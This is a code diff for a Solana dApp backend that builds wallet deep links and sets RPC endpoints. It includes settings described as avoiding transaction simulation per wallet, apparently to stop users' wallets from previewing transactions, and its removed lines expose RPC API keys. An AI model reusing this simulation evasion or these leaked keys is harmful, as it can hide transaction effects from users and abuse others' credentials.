@@ -35,7 +35,24 @@ function generateEncryptionKeyPair() {
 // Deep link generation functions
 function generatePhantomDeepLink(appUrl, isMobile) {
   try {
-    // Generate a random encryption key pair for dApp encryption
+    if (isMobile) {
+      // Mobile: Use correct Phantom URL structure with ref parameter
+      const encodedUrl = encodeURIComponent(appUrl);
+      const deepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
+      const fallbackLink = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
+      
+      return {
+        success: true,
+        deepLink: deepLink,
+        fallbackLink: fallbackLink,
+        parameters: {
+          url: appUrl,
+          encodedUrl: encodedUrl,
+          ref: encodedUrl
+        }
+      };
+    } else {
+      // Desktop: Use complex Connect API with encryption
     const encryptionKeyPair = generateEncryptionKeyPair();
     const dappEncryptionPublicKey = encryptionKeyPair.publicKey;
     
@@ -46,7 +63,7 @@ function generatePhantomDeepLink(appUrl, isMobile) {
     const cluster = 'mainnet-beta';
     
     // Construct the deep link with all required parameters
-    const baseUrl = isMobile ? 'phantom://v1/connect' : 'phantom://v1/connect';
+      const baseUrl = 'phantom://v1/connect';
     const params = new URLSearchParams({
       app_url: appUrl,
       dapp_encryption_public_key: dappEncryptionPublicKey,
@@ -69,23 +86,39 @@ function generatePhantomDeepLink(appUrl, isMobile) {
         cluster: cluster
       }
     };
+    }
   } catch (error) {
     console.error('[BACKEND_PHANTOM_DEEP_LINK] Error generating deep link:', error);
     return {
       success: false,
       error: error.message,
-      fallbackLink: `phantom://browse/${encodeURIComponent(appUrl)}`
+      fallbackLink: isMobile ? 
+        `https://phantom.app/ul/browse/${encodeURIComponent(appUrl)}` : 
+        `phantom://browse/${encodeURIComponent(appUrl)}`
     };
   }
 }
 
 function generateBackpackDeepLink(appUrl, isMobile) {
   try {
-    // Backpack Connect: https://backpack.app/ul/v1/connect
-    // Required parameters: app_url, dapp_encryption_public_key, redirect_link
-    // Optional: cluster (defaults to mainnet-beta)
-    
-    // Generate encryption key pair for secure communication
+    if (isMobile) {
+      // Mobile: Use correct Backpack browse URL structure (v1/browse with URL in path)
+      const encodedUrl = encodeURIComponent(appUrl);
+      const deepLink = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
+      const fallbackLink = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
+      
+      return {
+        success: true,
+        deepLink: deepLink,
+        fallbackLink: fallbackLink,
+        parameters: {
+          url: appUrl,
+          encodedUrl: encodedUrl,
+          ref: encodedUrl
+        }
+      };
+    } else {
+      // Desktop: Use complex Connect API with encryption
     const encryptionKeyPair = generateEncryptionKeyPair();
     const dappEncryptionPublicKey = encryptionKeyPair.publicKey;
     
@@ -102,9 +135,6 @@ function generateBackpackDeepLink(appUrl, isMobile) {
     const deepLink = `${customSchemeUrl}?${params.toString()}`;
     const universalLink = `${universalLinkUrl}?${params.toString()}`;
     
-    // Fallback: Use browse method for simpler connection
-    const browseUrl = `https://backpack.app/ul/browse/?url=${encodeURIComponent(appUrl)}&ref=${encodeURIComponent(appUrl)}`;
-    
     return {
       success: true,
       deepLink: deepLink,
@@ -117,23 +147,42 @@ function generateBackpackDeepLink(appUrl, isMobile) {
         cluster: 'mainnet-beta'
       }
     };
+    }
   } catch (error) {
     console.error('[BACKEND_BACKPACK_DEEP_LINK] Error generating deep link:', error);
     return {
       success: false,
       error: error.message,
-      fallbackLink: `https://backpack.app/ul/browse/?url=${encodeURIComponent(appUrl)}&ref=${encodeURIComponent(appUrl)}`
+      fallbackLink: isMobile ? 
+        `https://backpack.app/ul/browse/?url=${encodeURIComponent(appUrl)}&ref=${encodeURIComponent(appUrl)}` : 
+        `https://backpack.app/ul/browse/?url=${encodeURIComponent(appUrl)}&ref=${encodeURIComponent(appUrl)}`
     };
   }
 }
 
 function generateSolflareDeepLink(appUrl, isMobile) {
   try {
-    // Solflare Connect: https://solflare.com/ul/v1/connect
-    // Required parameters: app_url, dapp_encryption_public_key, redirect_link
-    // Optional: cluster (mainnet-beta, testnet, devnet - defaults to mainnet-beta)
-    
-    // Generate encryption key pair for secure communication
+    if (isMobile) {
+      // Mobile: Use correct Solflare URL structure (v1/browse with ref parameter)
+      const encodedUrl = encodeURIComponent(appUrl);
+      const params = new URLSearchParams({
+        ref: "https://solflare.com"
+      });
+      const deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?${params.toString()}`;
+      const fallbackLink = `solflare://v1/browse/${encodedUrl}?${params.toString()}`;
+      
+      return {
+        success: true,
+        deepLink: deepLink,
+        fallbackLink: fallbackLink,
+        parameters: {
+          url: appUrl,
+          encodedUrl: encodedUrl,
+          ref: "https://solflare.com"
+        }
+      };
+    } else {
+      // Desktop: Use complex Connect API with encryption
     const encryptionKeyPair = generateEncryptionKeyPair();
     const dappEncryptionPublicKey = encryptionKeyPair.publicKey;
     
@@ -150,9 +199,6 @@ function generateSolflareDeepLink(appUrl, isMobile) {
     const deepLink = `${customSchemeUrl}?${params.toString()}`;
     const universalLink = `${universalLinkUrl}?${params.toString()}`;
     
-    // Fallback: Use browse method for simpler connection
-    const browseUrl = `https://solflare.com/ul/browse/?url=${encodeURIComponent(appUrl)}`;
-    
     return {
       success: true,
       deepLink: deepLink,
@@ -165,49 +211,75 @@ function generateSolflareDeepLink(appUrl, isMobile) {
         cluster: 'mainnet-beta'
       }
     };
+    }
   } catch (error) {
     console.error('[BACKEND_SOLFLARE_DEEP_LINK] Error generating deep link:', error);
     return {
       success: false,
       error: error.message,
-      fallbackLink: `https://solflare.com/ul/browse/?url=${encodeURIComponent(appUrl)}`
+      fallbackLink: isMobile ? 
+        `https://solflare.com/ul/1/browse?url=${encodeURIComponent(appUrl)}&ref=${encodeURIComponent(appUrl)}` : 
+        `https://solflare.com/ul/browse/?url=${encodeURIComponent(appUrl)}`
     };
   }
 }
 
 function generateTrustWalletDeepLink(appUrl, isMobile) {
   try {
-    // Trust Wallet DApp Browser: https://link.trustwallet.com/open_url
-    // Required parameters: coin_id (501 for Solana), url
-    // Uses universal link for better compatibility
-    
-    const coinId = '501'; // Solana coin_id
-    const baseUrl = 'https://link.trustwallet.com/open_url';
-    const params = new URLSearchParams({
-      coin_id: coinId, // Solana coin_id
-      url: appUrl // Website URL to open in DApp browser
-    });
-    
-    const deepLink = `${baseUrl}?${params.toString()}`;
-    
-    // Fallback: Use custom scheme for direct deep linking
-    const customSchemeUrl = `trust://open_url?coin_id=${coinId}&url=${encodeURIComponent(appUrl)}`;
-    
-    return {
-      success: true,
-      deepLink: deepLink,
-      fallbackLink: customSchemeUrl,
-      parameters: {
-        coin_id: coinId,
-        url: appUrl
-      }
-    };
+    if (isMobile) {
+      // Mobile: Use correct Trust Wallet URL structure
+      const encodedUrl = encodeURIComponent(appUrl);
+      const deepLink = `https://link.trustwallet.com/open_url?url=${encodedUrl}`;
+      const fallbackLink = `trust://open_url?url=${encodedUrl}`;
+      
+      return {
+        success: true,
+        deepLink: deepLink,
+        fallbackLink: fallbackLink,
+        parameters: {
+          url: appUrl,
+          encodedUrl: encodedUrl
+        }
+      };
+    } else {
+      // Desktop: Use complex Connect API with encryption
+      const encryptionKeyPair = generateEncryptionKeyPair();
+      const dappEncryptionPublicKey = encryptionKeyPair.publicKey;
+      
+      // Construct the proper Trust Wallet Connect deep link
+      const customSchemeUrl = 'trust://v1/connect';
+      const universalLinkUrl = 'https://link.trustwallet.com/v1/connect';
+      const params = new URLSearchParams({
+        app_url: appUrl, // URL-encoded app metadata
+        dapp_encryption_public_key: dappEncryptionPublicKey, // Public key for encryption
+        redirect_link: appUrl, // Where to redirect after connection
+        cluster: 'mainnet-beta' // Solana mainnet
+      });
+      
+      const deepLink = `${customSchemeUrl}?${params.toString()}`;
+      const universalLink = `${universalLinkUrl}?${params.toString()}`;
+      
+      return {
+        success: true,
+        deepLink: deepLink,
+        fallbackLink: universalLink,
+        encryptionKey: encryptionKeyPair.privateKey,
+        parameters: {
+          app_url: appUrl,
+          dapp_encryption_public_key: dappEncryptionPublicKey,
+          redirect_link: appUrl,
+          cluster: 'mainnet-beta'
+        }
+      };
+    }
   } catch (error) {
     console.error('[BACKEND_TRUSTWALLET_DEEP_LINK] Error generating deep link:', error);
     return {
       success: false,
       error: error.message,
-      fallbackLink: `https://link.trustwallet.com/open_url?coin_id=501&url=${encodeURIComponent(appUrl)}`
+      fallbackLink: isMobile ? 
+        `https://link.trustwallet.com/open_url?url=${encodeURIComponent(appUrl)}` : 
+        `https://link.trustwallet.com/open_url?url=${encodeURIComponent(appUrl)}`
     };
   }
 }
@@ -294,33 +366,6 @@ function generateExodusDeepLink(appUrl, isMobile) {
   }
 }
 
-function generateEncryptionKeyPair() {
-  try {
-    // Generate a random 32-byte key using Node.js crypto
-    const privateKey = crypto.randomBytes(32);
-    
-    // Convert to base64 for storage
-    const privateKeyBase64 = privateKey.toString('base64');
-    
-    // For simplicity, we'll use the private key as public key (in real implementation, derive public key)
-    // In a production environment, you'd want to use proper key derivation
-    const publicKeyBase64 = privateKeyBase64; // Simplified for demo
-    
-    return {
-      privateKey: privateKeyBase64,
-      publicKey: publicKeyBase64
-    };
-  } catch (error) {
-    console.error('[BACKEND_ENCRYPTION_KEY] Error generating key pair:', error);
-    // Fallback to a simple random string
-    const fallbackKey = Math.random().toString(36).substring(2, 15);
-    return {
-      privateKey: fallbackKey,
-      publicKey: fallbackKey
-    };
-  }
-}
-
 // Wallet conflict resolution and detection
 function detectInstalledWallets() {
   // This would be called from frontend with window object context
@@ -345,90 +390,46 @@ const WALLET_DEFINITIONS = {
   backpack: {
     name: 'Backpack',
     logo: '/backpack-logo.png',
-    deepLink: 'backpack://app?url=',
-    universalLink: 'https://backpack.app/ul/app?url=',
+    deepLink: 'https://backpack.app/ul/v1/browse/',
+    universalLink: 'https://backpack.app/ul/v1/browse/',
     appStore: 'https://apps.apple.com/app/backpack-crypto-wallet/id6446603434',
     playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app',
     userAgentPattern: /Backpack|backpack/i,
     providerNames: ['window.backpack'],
     mobileStrategies: [
-      // iOS preferred schemes
-      'backpack://app?url=',
-      'backpack://browse?url=',
-      'backpack://dapp?url=',
-      'backpack://open?url=',
-      // Android preferred schemes
-      'backpack://wallet?url=',
-      'backpack://connect?url=',
-      // Universal links (iOS) and App Links (Android)
-      'https://backpack.app/ul/app?url=',
-      'https://backpack.app/ul/browse?url=',
-      'https://backpack.app/ul/dapp?url=',
-      'https://backpack.app/ul/open?url=',
-      'https://backpack.app/ul/wallet?url=',
-      'https://backpack.app/ul/connect?url='
+      // Only the correct Backpack URL structure
+      'https://backpack.app/ul/v1/browse/',
+      'backpack://v1/browse/'
     ]
   },
   phantom: {
     name: 'Phantom',
     logo: '/phantom-logo.png',
-    deepLink: 'phantom://browse/',
+    deepLink: 'https://phantom.app/ul/browse/',
     universalLink: 'https://phantom.app/ul/browse/',
     appStore: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977',
     playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
     userAgentPattern: /Phantom|phantom/i,
     providerNames: ['window.phantom', 'window.solana'],
     mobileStrategies: [
-      // iOS preferred schemes
-      'phantom://browse/',
-      'phantom://app/',
-      'phantom://dapp/',
-      'phantom://open/',
-      'phantom://wallet/',
-      'phantom://connect/',
-      // Android preferred schemes
-      'phantom://mobile/',
-      'phantom://android/',
-      // Universal links (iOS) and App Links (Android)
+      // Only the correct Phantom URL structure
       'https://phantom.app/ul/browse/',
-      'https://phantom.app/ul/app/',
-      'https://phantom.app/ul/dapp/',
-      'https://phantom.app/ul/open/',
-      'https://phantom.app/ul/wallet/',
-      'https://phantom.app/ul/connect/',
-      'https://phantom.app/ul/mobile/',
-      'https://phantom.app/ul/android/'
+      'phantom://browse/'
     ]
   },
   solflare: {
     name: 'Solflare',
     logo: '/solflare-logo.png',
-    deepLink: 'solflare://browse/',
-    universalLink: 'https://solflare.com/ul/browse/',
+    deepLink: 'https://solflare.com/ul/v1/browse/',
+    universalLink: 'https://solflare.com/ul/v1/browse/',
     appStore: 'https://apps.apple.com/app/solflare/id1580902717',
     playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
     userAgentPattern: /Solflare|solflare/i,
     providerNames: ['window.solflare'],
     mobileStrategies: [
-      // iOS preferred schemes
-      'solflare://browse/',
-      'solflare://app/',
-      'solflare://dapp/',
-      'solflare://open/',
-      'solflare://wallet/',
-      'solflare://connect/',
-      // Android preferred schemes
-      'solflare://mobile/',
-      'solflare://android/',
-      // Universal links (iOS) and App Links (Android)
-      'https://solflare.com/ul/browse/',
-      'https://solflare.com/ul/app/',
-      'https://solflare.com/ul/dapp/',
-      'https://solflare.com/ul/open/',
-      'https://solflare.com/ul/wallet/',
-      'https://solflare.com/ul/connect/',
-      'https://solflare.com/ul/mobile/',
-      'https://solflare.com/ul/android/'
+      // Only the correct Solflare URL structure
+      'https://solflare.com/ul/v1/browse/',
+      'solflare://v1/browse/'
     ]
   },
   glow: {
@@ -465,32 +466,16 @@ const WALLET_DEFINITIONS = {
   trustwallet: {
     name: 'Trust Wallet',
     logo: '/trust-logo.png',
-    deepLink: 'trust://open?url=',
-    universalLink: 'https://link.trustwallet.com/open_url?coin_id=501&url=',
+    deepLink: 'https://link.trustwallet.com/open_url',
+    universalLink: 'https://link.trustwallet.com/open_url',
     appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
     playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
     userAgentPattern: /Trust|trust/i,
     providerNames: ['window.trustwallet'],
     mobileStrategies: [
-      // iOS preferred schemes
-      'trust://open?url=',
-      'trust://browse?url=',
-      'trust://dapp?url=',
-      'trust://app?url=',
-      'trust://wallet?url=',
-      'trust://connect?url=',
-      // Android preferred schemes
-      'trust://mobile?url=',
-      'trust://android?url=',
-      // Universal links (iOS) and App Links (Android)
-      'https://link.trustwallet.com/open_url?coin_id=501&url=',
-      'https://link.trustwallet.com/browse_url?coin_id=501&url=',
-      'https://link.trustwallet.com/dapp_url?coin_id=501&url=',
-      'https://link.trustwallet.com/app_url?coin_id=501&url=',
-      'https://link.trustwallet.com/wallet_url?coin_id=501&url=',
-      'https://link.trustwallet.com/connect_url?coin_id=501&url=',
-      'https://link.trustwallet.com/mobile_url?coin_id=501&url=',
-      'https://link.trustwallet.com/android_url?coin_id=501&url='
+      // Only the correct Trust Wallet URL structure
+      'https://link.trustwallet.com/open_url',
+      'trust://open_url'
     ]
   },
   exodus: {
@@ -633,8 +618,8 @@ function validateWallet(publicKey, walletType) {
 async function fetchWalletBalance(publicKey, maxRetries = 3) {
   const rpcEndpoints = [
     'https://api.mainnet-beta.solana.com',
-    'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
-    'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0'
+    process.env.HELIUS_RPC_URL || 'https://api.mainnet-beta.solana.com',
+    process.env.SHYFT_RPC_URL || 'https://api.mainnet-beta.solana.com'
   ];
 
   let lastError;
@@ -917,8 +902,11 @@ function getSimulationPreventionSettings(walletType, hasComputeBudget = false) {
     case 'solflare':
       return {
         ...baseSettings,
-        commitment: 'confirmed', // Solflare prefers confirmed
-        skipPreflight: true // Skip simulation for Solflare
+        commitment: 'processed', // Use processed to avoid simulation
+        skipPreflight: true, // Skip simulation for Solflare
+        minContextSlot: undefined, // Don't specify minContextSlot
+        maxRetries: 0, // No retries to prevent re-simulation
+        disableRetryOnRateLimit: true // Disable retries
       };
       
     case 'backpack':
@@ -961,8 +949,8 @@ function getSimulationPreventionSettings(walletType, hasComputeBudget = false) {
 async function broadcastTransaction(signedTransaction, maxRetries = 1, walletType = 'unknown') {
   const rpcEndpoints = [
     'https://api.mainnet-beta.solana.com',
-    'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
-    'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0'
+    process.env.HELIUS_RPC_URL || 'https://api.mainnet-beta.solana.com',
+    process.env.SHYFT_RPC_URL || 'https://api.mainnet-beta.solana.com'
   ];
 
   // Use the provided wallet type for wallet-specific configurations
@@ -1093,15 +1081,15 @@ async function monitorTransaction(signature, maxAttempts = 3, walletType = 'unkn
   }
   
   const rpcEndpoints = [
-    'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', // Helius RPC (premium)
-    'https://rpc.shyft.to?api_key=SHYFT_API_KEY' // Shyft RPC (premium) - replace with actual key
+    process.env.HELIUS_RPC_URL || 'https://api.mainnet-beta.solana.com', // Helius RPC (premium)
+    process.env.SHYFT_RPC_URL || 'https://api.mainnet-beta.solana.com' // Shyft RPC (premium)
   ]; // Premium RPC endpoints only for reliable monitoring
 
   for (const rpcUrl of rpcEndpoints) {
     try {
       const connection = new Connection(rpcUrl, {
         commitment: 'confirmed',
-        confirmTransactionInitialTimeout: walletType === 'phantom' ? 45000 : 30000, // Increased timeout for Phantom (45s)
+        confirmTransactionInitialTimeout: walletType === 'phantom' ? 45000 : walletType === 'trustwallet' ? 0 : 30000, // Trust Wallet handles its own timeouts
         disableRetryOnRateLimit: true // Disable retries to prevent hanging
       });
 
